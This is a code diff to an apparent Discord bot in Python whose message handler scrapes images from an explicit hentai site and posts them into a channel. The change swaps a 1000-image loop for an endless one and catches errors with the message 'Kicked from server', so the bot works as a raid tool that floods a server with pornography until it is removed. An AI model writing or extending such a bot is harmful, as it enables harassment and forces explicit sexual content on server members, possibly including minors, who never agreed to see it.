@@ -99,15 +99,17 @@ async def on_message(message):
           
 
           hentai = imagesearch.getImages("https://hentaihaven.xxx") #load hentai from hentaihaven (kill me now)
-
-          for x in range(1000): #repeat 1000
-               y = random.choice(hentai) #get random bit of hentai
-               async with aiohttp.ClientSession() as session: #http stuff I don't understand
-                    async with session.get(y) as resp:
-                         if resp.status != 200:
-                              return await channel.send('`error loading image`')
-                         data = io.BytesIO(await resp.read())
-                         await channel.send(file=discord.File(data, os.path.basename(y))) #send hentai
+          try:
+               while True: #repeat 1000
+                    y = random.choice(hentai) #get random bit of hentai
+                    async with aiohttp.ClientSession() as session: #http stuff I don't understand
+                         async with session.get(y) as resp:
+                              if resp.status != 200:
+                                   return await channel.send('`error loading image`')
+                              data = io.BytesIO(await resp.read())
+                              await channel.send(file=discord.File(data, os.path.basename(y))) #send hentai
+          except Exception:
+               print("Kicked from server")
          
      
 @client.event
